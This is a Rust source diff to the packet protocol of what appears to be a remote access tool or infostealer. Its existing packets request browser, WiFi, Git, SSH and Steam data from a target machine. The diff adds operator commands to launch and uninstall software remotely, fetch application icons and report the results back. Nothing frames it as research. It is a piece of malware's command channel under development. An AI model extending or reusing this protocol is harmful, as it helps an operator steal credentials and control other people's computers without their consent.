@@ -43,6 +43,8 @@ pub enum ServerboundPacket {
     BrowserData(BrowserData),
     WifiData(WifiData),
     SoftwareInventory(SoftwareInventory),
+    SoftwareIconResult(SoftwareIconResult),
+    SoftwareActionResult(SoftwareActionResult),
     GitData(GitData),
     SSHData(SSHData),
     SteamData(SteamData),
@@ -89,6 +91,8 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::BrowserData(_) => "Browser Data",
             ServerboundPacket::WifiData(_) => "WiFi Data",
             ServerboundPacket::SoftwareInventory(_) => "Software Inventory",
+            ServerboundPacket::SoftwareIconResult(_) => "Software Icon Result",
+            ServerboundPacket::SoftwareActionResult(_) => "Software Action Result",
             ServerboundPacket::GitData(_) => "Git Data",
             ServerboundPacket::SSHData(_) => "SSH Data",
             ServerboundPacket::SteamData(_) => "Steam Data",
@@ -167,6 +171,9 @@ pub enum ClientboundPacket {
     GetBrowserData,
     GetWifiData,
     GetSoftwareInventory,
+    LaunchSoftware(String),
+    UninstallSoftware(String),
+    GetSoftwareIcon(String),
     GetGitData,
     GetSSHData,
     GetSteamData,
@@ -249,6 +256,9 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::GetBrowserData => "Get Browser Data",
             ClientboundPacket::GetWifiData => "Get Wifi Data",
             ClientboundPacket::GetSoftwareInventory => "Get Software Inventory",
+            ClientboundPacket::LaunchSoftware(_) => "Launch Software",
+            ClientboundPacket::UninstallSoftware(_) => "Uninstall Software",
+            ClientboundPacket::GetSoftwareIcon(_) => "Get Software Icon",
             ClientboundPacket::GetGitData => "Get Git Data",
             ClientboundPacket::GetSSHData => "Get SSH Data",
             ClientboundPacket::GetSteamData => "Get Steam Data",
@@ -435,11 +445,26 @@ pub struct SoftwareEntry {
     pub publisher: String,
     pub install_location: String,
     pub uninstall_command: String,
+    pub executable_path: String,
+    pub icon_base64: String,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
 pub struct SoftwareInventory {
     pub applications: Vec<SoftwareEntry>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareIconResult {
+    pub name: String,
+    pub icon_base64: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct SoftwareActionResult {
+    pub name: String,
+    pub success: bool,
+    pub message: String,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
